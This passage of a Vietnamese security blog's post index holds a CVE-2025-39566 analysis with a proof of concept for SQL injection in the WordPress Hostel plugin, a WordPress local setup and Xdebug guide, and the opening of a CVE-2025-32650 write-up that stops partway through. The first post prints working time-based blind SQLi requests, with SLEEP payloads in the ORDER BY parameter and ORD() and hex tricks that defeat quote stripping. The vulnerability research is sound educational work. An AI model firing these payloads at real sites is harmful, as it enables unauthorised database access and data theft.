d·∫°ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ƒê√°ng ch√∫ √Ω, bi·∫øn $orderby ƒë∆∞·ª£c g√°n nh∆∞ sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ‚ö†Ô∏è ·ªû ƒë√¢y c√≥ ƒëi·ªÉm b·∫•t th∆∞·ªùng:\nPh·∫ßn sau ORDER BY s·ª≠ d·ª•ng sanitize_text_field(). H√†m n√†y ch·ªâ l√†m s·∫°ch HTML, kh√¥ng h·ªÅ filter ho·∫∑c validate ƒë·ªÉ ƒë·∫£m b·∫£o an to√†n trong SQL context. Tham s·ªë ob (do ng∆∞·ªùi d√πng truy·ªÅn v√†o) v√¨ v·∫≠y c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng ƒë·ªÉ ch√®n tr·ª±c ti·∫øp v√†o c√¢u SQL. Exploit Detect SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta t√°ch m·ªánh ƒë·ªÅ ORDER BY b·∫±ng , v√¨ n√≥ ch·∫•p nh·∫≠p multi column\nK·∫øt qu·∫£: th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nDump Data from Database Bypass ' using ORD():\nƒê·ªÉ dump d·ªØ li·ªáu c·ªßa database ta c·∫ßn th·ª≠ ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name.\nDo sanitize_text_field() lo·∫°i b·ªè ', ta kh√¥ng d√πng ƒë∆∞·ª£c payload so s√°nh tr·ª±c ti·∫øp. Thay v√†o ƒë√≥ d√πng ORD() ƒë·ªÉ so s√°nh k√Ω t·ª± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nBypass ' using Hex encoding (extend)\nNgo√†i ORD() ta c√≥ th·ªÉ s·ª≠ d·ª•ng Hex encoding ƒë·ªÉ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nConclusion L·ªó h·ªïng CVE-2025-39566 trong plugin WordPress Hostel tr∆∞·ªõc phi√™n b·∫£n 1.1.5.7, xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nKey takeaways:\nsanitize_text_field() ‚â† ch·ªëng SQL Injection C·∫ßn ph√¢n bi·ªát r√µ: l·ªçc input cho HTML vs cho SQL References SQL Injection Cheat Sheet ‚Äì PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eL·ªó h·ªïng trong plugin \u003cstrong\u003eHostel\u003c/strong\u003e tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu kh√¥ng ƒë√∫ng c√°ch, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) v√† v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ \u003cstrong\u003eGET\u003c/strong\u003e request v√†o SQL query m√† c∆° ch·∫ø ki·ªÉm so√°t kh√¥ng ch·∫∑t ch·∫Ω.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\nRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶ Hi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress. C√≥ 2 phi√™n b·∫£n WordPress:\nWordPress.com D·ªãch v·ª• hosting do Automattic cung c·∫•p B·∫°n ch·ªâ c·∫ßn ƒëƒÉng k√Ω t√†i kho·∫£n, kh√¥ng ph·∫£i c√†i ƒë·∫∑t H·∫°n ch·∫ø t√πy ch·ªânh, mu·ªën n√¢ng cao th√¨ ph·∫£i tr·∫£ ph√≠ WordPress.org M√£ ngu·ªìn m·ªü, b·∫°n t·ª± t·∫£i v·ªÅ v√† c√†i ƒë·∫∑t l√™n hosting/server ri√™ng T√πy ch·ªânh to√†n di·ªán, c√≥ th·ªÉ c√†i plugin, theme, vi·∫øt code, t·∫°o website theo √Ω m√¨nh Ecosystem Core: CMS ch√≠nh Plugin: M·ªôt ph·∫ßn m·ªÅm b·ªï sung c√≥ th·ªÉ ƒë∆∞·ª£c c√†i ƒë·∫∑t tr√™n trang web WordPress ƒë·ªÉ m·ªü r·ªông ch·ª©c nƒÉng c·ªßa n√≥ v√† th√™m c√°c t√≠nh nƒÉng m·ªõi Themes: M·ªôt ph·∫ßn m·ªÅm b·ªï sung ƒë·∫°i di·ªán cho s·ª± xu·∫•t hi·ªán tr·ª±c quan v√† b·ªë c·ª•c c·ªßa m·ªôt trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hi·ªán t·∫°i h∆°n 40% website tr√™n to√†n th·∫ø gi·ªõi ch·∫°y WordPress Nghƒ©a l√† hacker ch·ªâ c·∫ßn t√¨m ra m·ªôt l·ªó h·ªïng ph·ªï bi·∫øn =\u0026gt; c√≥ th·ªÉ khai th√°c h√†ng tri·ªáu site c√πng l√∫c Gi·ªëng nh∆∞ ‚Äúc√° nhi·ªÅu th√¨ ch√†i ·ªü ƒë√≥‚Äù Plugin and Theme WordPress Core ƒë√£ ƒë∆∞·ª£c xem x√©t trong 1 th·ªùi gian d√†i b·ªüi h√†ng ng√†n developers v√† researchers. K·∫øt qu·∫£ l√† r·∫•t kh√≥ ƒë·ªÉ k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ƒë·ªôt nh·∫≠p v√†o Tuy nhi√™n, c√≥ h√†ng ch·ª•c ng√†n plugin v√† theme t·ª´ nhi·ªÅu ngu·ªìn, ch·∫•t l∆∞·ª£ng kh√¥ng ƒë·ªìng ƒë·ªÅu ƒë∆∞·ª£c s·ª≠ d·ª•ng Nhi·ªÅu plugin code b·∫£o m·∫≠t k√©m, kh√¥ng c√≤n ƒë∆∞·ª£c c·∫≠p nh·∫≠t. Hacker ch·ªâ c·∫ßn scan plugin/theme ƒë·ªÉ t√¨m version l·ªói th·ªùi, r·ªìi khai th√°c Setup WordPress for Hacking C√≥ r·∫•t nhi·ªÅu c√°ch ƒë·ªÉ setup WorkPress, t√¨m ki·∫øm b·∫±ng Google c√≥ th·ªÉ cung c·∫•p nhi·ªÅu b√†i vi·∫øt v·ªÅ n√≥. ·ªû ƒë√¢y t√¥i s·∫Ω setup tr√™n m√°y ·∫£o Ubuntu (22.04):\nKh√¥ng ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c d·ªãch v·ª• c·ªßa m√°y th·∫≠t WordPress t∆∞∆°ng ƒë·ªëi nh·∫π ƒë·ªÉ s·ª≠ d·ª•ng tr√™n m√°y ·∫£o Install and configure WordPress Install Dependencies C√†i to√†n b·ªô stack c·∫ßn thi·∫øt ƒë·ªÉ ch·∫°y WordPress (web server + database + PHP + c√°c extension quan tr·ªçng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress T·∫£i v√† c√†i m√£ ngu·ªìn WordPress v√†o th∆∞ m·ª•c web.\n# T·∫°o folder ƒë·ªÉ l∆∞u tr·ªØ m√£ ngu·ªìn website sudo mkdir -p /srv/www # ƒê·ªïi owner th√†nh www-data, ƒë√¢y l√† user m·∫∑c ƒë·ªãnh c·ªßa Apache/Nginx ƒë·ªÉ ch·∫°y web server # Khi Apache/NGINX kh·ªüi ƒë·ªông, n√≥ kh√¥ng ch·∫°y b·∫±ng root (nguy hi·ªÉm v√¨ c√≥ to√†n quy·ªÅn h·ªá th·ªëng), m√† s·∫Ω drop xu·ªëng ch·∫°y d∆∞·ªõi quy·ªÅn www-data. sudo chown www-data: /srv/www # T·∫£i g√≥i WordPress m·ªõi nh·∫•t t·ª´ trang ch√≠nh th·ª©c # Gi·∫£i n√©n vao th∆∞c m·ª•c /srv/www ƒë∆∞·ª£c t·∫°o ·ªü tr√™n curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www C√≥ th·ªÉ t·∫£i phi√™n b·∫£n c·ª• th·ªÉ b·∫±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www C√†i t·ª´ wordpress.org l√† c√°ch chu·∫©n nh·∫•t v√† √≠t r·ªßi ro:\nUbuntu c√≥ s·∫µn package wordpress trong repo. Nh∆∞ng n√≥ th∆∞·ªùng c≈© h∆°n nhi·ªÅu so v·ªõi b·∫£n ch√≠nh th·ª©c tr√™n wordpress.org C·ªông ƒë·ªìng WordPress ch·ªâ h·ªó tr·ª£ khi b·∫°n d√πng b·∫£n ch√≠nh th·ª©c t·ª´ wordpress.org, v√¨ n·∫øu b·∫°n g·∫∑p l·ªói do package c·ªßa Ubuntu th√¨ h·ªç kh√¥ng gi·∫£i quy·∫øt ƒë∆∞·ª£c. Configure Apache for WordPress T·∫°o file /etc/apache2/sites-available/wordpress.conf c·∫•u h√¨nh Apache cho WordPress:\n# L·∫Øng nghe tr√™n t·∫•t c·∫£ ƒë·ªãa ch·ªâ IP (*) t·∫°i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # Th∆∞ m·ª•c g·ªëc c·ªßa website (n∆°i ch·ª©a m√£ ngu·ªìn WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho ph√©p file .htaccess ghi ƒë√® m·ªôt s·ªë thi·∫øt l·∫≠p li√™n quan ƒë·∫øn b·∫£o m·∫≠t v√† URL rewriting. AllowOverride Limit Options FileInfo # Khi truy c·∫≠p th∆∞ m·ª•c, Apache s·∫Ω t√¨m file index.php ƒë·ªÉ hi·ªÉn th·ªã. DirectoryIndex index.php # Cho ph√©p t·∫•t c·∫£ m·ªçi ng∆∞·ªùi truy c·∫≠p (c·∫ßn cho website public). Require all granted \u0026lt;/Directory\u0026gt; # Ri√™ng th∆∞ m·ª•c wp-content (ch·ª©a plugin, theme, upload) c≈©ng cho ph√©p truy c·∫≠p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; K√≠ch ho·∫°t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (t·∫°o symlink t·ª´ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau ƒë√≥ site wordpress s·∫Ω ƒë∆∞·ª£c Apache load khi restart. K√≠ch ho·∫°t module rewrite:\nsudo a2enmod rewrite WordPress c·∫ßn module mod_rewrite ƒë·ªÉ h·ªó tr·ª£ Pretty Permalinks (v√≠ d·ª• /blog/hello-world/ thay v√¨ ?p=123) V√¥ hi·ªáu h√≥a site m·∫∑c ƒë·ªãnh (Option):\nsudo a2dissite 000-default Apache m·∫∑c ƒë·ªãnh c√≥ site 000-default.conf (ch·ªâ hi·ªÉn th·ªã \u0026ldquo;It works!\u0026rdquo;) N·∫øu kh√¥ng disable, site m·∫∑c ƒë·ªãnh c√≥ th·ªÉ chi·∫øm port 80 tr∆∞·ªõc WordPress üëâ Ho·∫∑c n·∫øu kh√¥ng mu·ªën disable, c√≥ th·ªÉ th√™m ServerName v√†o VirtualHost WordPress ƒë·ªÉ Apache ph√¢n bi·ªát domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Mu·ªën ch·∫°y ƒë∆∞·ª£c th√¨ ph·∫£i c·∫•u h√¨nh DNS ho·∫∑c s·ª≠a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload T·∫£i l·∫°i c·∫•u h√¨nh m·ªõi m√† kh√¥ng c·∫ßn d·ª´ng server Configure database WordPress c·∫ßn m·ªôt c∆° s·ªü d·ªØ li·ªáu (MySQL/MariaDB) ƒë·ªÉ l∆∞u:\nB√†i vi·∫øt, trang, menu Ng∆∞·ªùi d√πng, m·∫≠t kh·∫©u (hash) C·∫•u h√¨nh site Plugins, themes settings M·ªü MySQL v·ªõi quy·ªÅn root:\nsudo mysql -u root C·∫•u h√¨nh MySQL:\n-- T·∫°o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- T·∫°o user ri√™ng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- C·∫•p quy·ªÅn cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- L√†m m·ªõi l·∫°i quy·ªÅn mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Tho√°t mysql\u0026gt; quit Bye Kh·ªüi ƒë·ªông l·∫°i d·ªãch v·ª•:\nsudo service mysql start Configure WordPress to connect to the database Copy file c·∫•u h√¨nh m·∫´u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi t·∫£i v·ªÅ c√≥ s·∫µn file wp-config-sample.php B·∫°n copy n√≥ th√†nh wp-config.php ƒë·ªÉ l√†m file c·∫•u h√¨nh ch√≠nh cho site Ch·ªânh s·ª≠a th√¥ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ƒê√¢y l√† 3 d√≤ng thay th·∫ø text trong file wp-config.php: database_name_here =\u0026gt; wordpress (t√™n DB ƒë√£ t·∫°o ·ªü b∆∞·ªõc tr∆∞·ªõc) username_here =\u0026gt; wordpress (user MySQL ƒë√£ t·∫°o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password ƒë√£ set) Khi Apache ch·∫°y WordPress, n√≥ s·∫Ω ƒë·ªçc file n√†y ƒë·ªÉ bi·∫øt d√πng user n√†o + DB n√†o ƒë·ªÉ k·∫øt n·ªëi MySQL Th√™m Secret Keys v√† Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php üëâ ƒê√¢y l√† chu·ªói b√≠ m·∫≠t m√† WordPress d√πng ƒë·ªÉ:\nM√£ h√≥a session cookies Sinh ra token (nonce) ch·ªëng CSRF NgƒÉn ch·∫∑n t·∫•n c√¥ng ki·ªÉu ‚Äúknown secret‚Äù (v√≠ d·ª• k·∫ª t·∫•n c√¥ng ƒëo√°n ƒë∆∞·ª£c secret m·∫∑c ƒë·ªãnh ƒë·ªÉ gi·∫£ m·∫°o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay ƒë·ªïi n√≥ b·∫±ng c√°c chu·ªói random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy c·∫≠p http://localhost, ƒë·∫∑t site title, username, password, email cho user admin\nSetup Debug on VSCode ƒê·ªÉ hi·ªÉu ƒë∆∞·ª£c lu·ªìng c·ªßa trang web ch·∫°y v√† x·ª≠ l√≠ ·ªü m·ªói request, ta c·∫ßn ph·∫£i debug n√≥.\nAdd PHP Debug extension on VS Code V√†o Extensions (Ctrl+Shift+X) =\u0026gt; t√¨m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension n√†y k·∫øt n·ªëi v·ªõi Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Ki·ªÉm tra c√†i ch∆∞a:\nphp -v N·∫øu c√≥ d√≤ng with Xdebug v3.x.x nghƒ©a l√† ƒë√£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini Th√™m v√†o cu·ªëi file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port m·∫∑c ƒë·ªãnh m·ªõi c·ªßa Xdebug v3 l√† 9003.\nSau ƒë√≥ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json M·ªü th∆∞ m·ª•c ch·ª©a trang web wordpress b·∫±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; t·∫°o file launch.json v·ªõi n·ªôi dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: √°nh x·∫° th∆∞ m·ª•c trong container/server (/srv/www/wordpress) v·ªÅ th∆∞ m·ª•c local c·ªßa trong VS Code.\nNh∆∞ v·∫≠y l√† ƒë√£ ho√†n th√†nh setup WordPress tr√™n local k·∫øt h·ª£p Debug n√≥ tr√™n VSCode.\nExtend Required Version M·ªói phi√™n b·∫£n WordPress th∆∞·ªùng ƒëi k√®m 1 phi√™n b·∫£n PHP th√≠ch h·ª£p. N√™n ki·ªÉm tra t√≠nh t∆∞∆°ng th√≠ch n√†y ƒë·ªÉ qu√° tr√¨nh setup kh√¥ng b·ªã l·ªói.\nWordPress Auto Update T·ª´ WordPress 3.7 tr·ªü ƒëi (2013), WordPress c√≥ c∆° ch·∫ø t·ª± ƒë·ªông c·∫≠p nh·∫≠t (automatic background updates) cho:\nB·∫£n v√° b·∫£o m·∫≠t (security release). B·∫£n b·∫£o tr√¨ (maintenance release). Kh√¥ng t·ª± ƒë·ªông update major version (tr·ª´ khi b·∫≠t r√µ r√†ng). H·ªá th·ªëng ki·ªÉm tra v·ªõi server api.wordpress.org ƒë·ªÉ xem c√≥ b·∫£n v√° n√†o m·ªõi s·∫Ω t·ª± ƒë·ªông n√¢ng c·∫•p background l√™n. Vi·ªác n√†y di·ªÖn ra r·∫•t nhanh sau khi setup, n√™n b·∫°n th·∫•y code ƒë·ªïi kh√°c so v·ªõi source g·ªëc.\nQu√° tr√¨nh setup di·ªÖn ra khi truy c·∫≠p /wp-admin/install.php\nƒê·ªÉ v√¥ hi·ªáu h√≥a c∆° ch·∫ø c·∫≠p nh·∫≠t t·ª± ƒë·ªông n√†y, th√™m d√≤ng sau v√†o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size M·∫∑c ƒë·ªãnh, WordPress ph·ª• thu·ªôc v√†o c·∫•u h√¨nh PHP (upload_max_filesize, post_max_size, v√† ƒë√¥i khi c·∫£ max_execution_time) ƒë·ªÉ x√°c ƒë·ªãnh dung l∆∞·ª£ng file t·ªëi ƒëa c√≥ th·ªÉ upload. Tr√™n nhi·ªÅu hosting, gi·ªõi h·∫°n n√†y ch·ªâ kho·∫£ng 2MB ‚Äì 8MB, kh√¥ng ƒë·ªß cho c√°c plugin hi·ªán ƒë·∫°i.\nWhy Increase the Limit? Plugin dung l∆∞·ª£ng l·ªõn: C√°c plugin nh∆∞ WooCommerce extension, page builder, backup, ho·∫∑c security suite c√≥ th·ªÉ n·∫∑ng 20MB ‚Äì 100MB.\nTr√°nh l·ªói upload: N·∫øu file .zip l·ªõn h∆°n gi·ªõi h·∫°n, b·∫°n s·∫Ω g·∫∑p l·ªói:\n‚ÄúThe uploaded file exceeds the upload_max_filesize directive in php.ini‚Äù Ho·∫∑c upload th·∫•t b·∫°i. Thu·∫≠n ti·ªán cho qu·∫£n tr·ªã vi√™n: C√≥ th·ªÉ c√†i tr·ª±c ti·∫øp qua Dashboard m√† kh√¥ng c·∫ßn FTP/SSH.\nH·ªó tr·ª£ ph√°t tri·ªÉn plugin: Plugin t·ª± vi·∫øt k√®m nhi·ªÅu th∆∞ vi·ªán/asset c√≥ th·ªÉ kh√° n·∫∑ng, vi·ªác tƒÉng gi·ªõi h·∫°n gi√∫p test d·ªÖ d√†ng h∆°n.\nHow to Increase Plugin Upload Size S·ª≠a php.ini (n·∫øu c√≥ quy·ªÅn server):\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 S·ª≠a file .htaccess (n·∫øu d√πng Apache):\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 Th√™m v√†o wp-config.php:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); üëâ L·ªùi khuy√™n: Ch·ªâ n√™n ƒë·∫∑t gi·ªõi h·∫°n v·ª´a ƒë·ªß (64MB ho·∫∑c 128MB). Tr√°nh ƒë·∫∑t qu√° l·ªõn ƒë·ªÉ h·∫°n ch·∫ø nguy c∆° b·ªã upload file n·∫∑ng g√¢y qu√° t·∫£i server.\n","permalink":"//localhost:1313/vi/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶\u003c/li\u003e\n\u003cli\u003eHi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eC√≥ 2 phi√™n b·∫£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Accessibility Suite c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 4.19. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-32650 Product: WordPress Accessibility Suite Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 4.18 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Accessibility Suite: v4.18(vul) v√† v4.19(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng ch∆∞a th·ª±c hi·ªán √©p ki·ªÉu cho input v√† m·∫∑c d√π c√≥ s·ª≠ d·ª•ng prepare() ƒë·ªÉ ch·ªëng SQLi, nh∆∞ng do tri·ªÉn khai kh√¥ng ƒë√∫ng n√™n l·ªó h·ªïng SQLi v·∫´n t·ªìn t·∫°i.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file includes/classes/Helper.php\nstatic function save_false_positive($scan_id, $issue_id){ // other logic if(! is_admin()) { return \u0026#39;\u0026#39;; } // 